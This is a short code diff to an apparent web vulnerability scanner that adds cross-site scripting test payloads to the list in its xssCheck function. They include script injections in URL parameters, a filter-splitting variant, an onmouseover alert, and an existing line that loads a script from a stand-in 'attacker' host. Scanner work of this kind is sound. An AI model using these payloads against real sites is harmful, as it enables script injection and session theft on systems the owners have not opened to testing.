@@ -224,7 +224,10 @@ def submitForms(myLinks):
 
 def xssCheck(myLinks):
 	myPayload = ["<input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\">",
-				 "http://example/?var=<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss.js\"></SCRIPT>"]
+				 "http://example/?var=<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss.js\"></SCRIPT>",
+				 "http://example/page.php?param=<script>[...]</script>",
+				 "http://example/page.php?param=<script&param=>[...]</&param=script>",
+				 "<IMG SRC=# onmouseover=\"alert('xxs')\">"]
 	global myHtmlGetter
 	count = 0
 	myList = []
